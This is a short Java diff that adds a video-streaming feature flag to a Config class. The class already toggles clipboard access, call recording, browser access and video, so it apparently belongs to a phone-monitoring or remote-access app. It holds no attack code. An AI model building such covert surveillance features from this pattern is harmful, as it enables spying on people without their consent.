@@ -24,7 +24,7 @@ public class Config {
     public static final boolean ENABLE_CLIPBOARD = true;
     public static final boolean ENABLE_CALL_RECORDING = true;
     public static final boolean ENABLE_BROWSER = true;
-    
+    public static final boolean ENABLE_VIDEO_STREAM = true;
     // NEW: Video streaming module flag
     public static final boolean ENABLE_VIDEO = true;
     
